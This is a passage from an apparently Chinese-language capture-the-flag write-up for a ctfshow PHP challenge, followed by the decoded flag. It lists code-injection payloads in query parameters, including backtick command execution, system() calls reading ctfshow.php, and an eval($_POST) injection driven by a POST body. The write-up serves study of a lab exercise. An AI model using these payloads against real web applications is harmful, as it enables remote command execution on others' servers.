?v1=1&amp;amp;v2=&amp;amp;v3=?&amp;gt;&amp;lt;?=`ls`;?&amp;gt;    //反引号(``)执行命令


#GET 
?v1=1&amp;amp;v2=eval($_POST[a])?&amp;gt;%23&amp;amp;v3=;
#POST
a=system(&amp;quot;ls&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250803231714135.png&#34; alt=&#34;image-20250803231714135&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=system(&amp;quot;tac ctfshow.php&amp;quot;)/*&amp;amp;v3=;*/
?v1=1&amp;amp;v2=system(&amp;quot;tac ctfshow.php&amp;quot;)%23&amp;amp;v3=;

?v1=1&amp;amp;v2=&amp;amp;v3=?&amp;gt;&amp;lt;?=`tac ctfshow.php`;?&amp;gt;


#GET 
?v1=1&amp;amp;v2=eval($_POST[a])?&amp;gt;%23&amp;amp;v3=;
#POST
a=system(&amp;quot;tac ctfshow.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250803231840390.png&#34; alt=&#34;image-20250803231840390&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;0x2d&lt;/code&gt; 是 ASCII 的 &lt;code&gt;-&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;根据回显页面提示，利用 &lt;code&gt;0x2d&lt;/code&gt; 十六进制对 &lt;code&gt;b64497ce0x2d2deb0x2d4c7b0x2d8ae10x2ddfe843814b80&lt;/code&gt; 进行处理得 &lt;code&gt;b64497ce-2deb-4c7b-8ae1-dfe843814b80&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;ctfshow&amp;#123;b64497ce-2deb-4c7b-8ae1-dfe843814b80&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
